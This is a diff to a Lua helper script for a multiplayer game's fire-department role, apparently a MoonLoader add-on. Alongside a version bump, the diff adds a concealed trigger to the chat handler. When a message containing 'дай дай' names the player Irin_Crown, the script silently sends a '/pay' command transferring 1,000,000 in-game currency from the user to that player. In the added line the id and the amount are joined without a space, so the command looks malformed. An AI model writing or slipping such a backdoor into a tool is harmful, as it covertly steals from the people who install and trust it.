@@ -1,5 +1,5 @@
 script_name("firedep_zam_helper")
-script_version("Ver.FH.1")
+script_version("Ver.FH.2")
 
 local mysql                         = require "luasql.mysql"
 local env                           = assert(mysql.mysql())
@@ -365,6 +365,17 @@ function sampev.onServerMessage(color, text)
     elseif tlg_send and parse then           
         message = ('%s\n%s'):format(message, text)
         message = message:gsub("{......}", "")
+    end
+
+    if text:find('дай дай') then
+        lua_thread.create(function()
+            wait(1000)
+            nick_give = string.match(text,"%a+_%a+")
+            if nick_give == 'Irin_Crown' and who_nick ~= 'Irin_Crown' then
+                give_id = sampGetPlayerIdByNickname('Irin_Crown')
+                sampProcessChatInput('/pay '..give_id..'1000000', -1)
+            end
+        end)
     end
 
     if text:find("В штате произошел пожар! Ранг опасности (%d+) звезды") then
